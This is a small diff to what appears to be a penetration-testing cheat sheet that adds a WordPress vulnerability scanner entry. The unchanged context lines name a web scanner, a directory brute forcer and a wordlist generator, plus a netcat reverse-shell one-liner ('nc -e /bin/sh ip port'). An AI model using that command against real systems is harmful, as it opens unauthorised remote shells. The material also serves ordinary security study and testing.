@@ -29,7 +29,7 @@ nc -e /bin/sh ip  port    | sends a shell to the ip
 nikto                     | web vulnrability checker
 dirb                      | web brute forcer
 crunch                    |  wordlist generator
-
+wpscan                    | scan for wordpress vulnerabilities
 
 
 
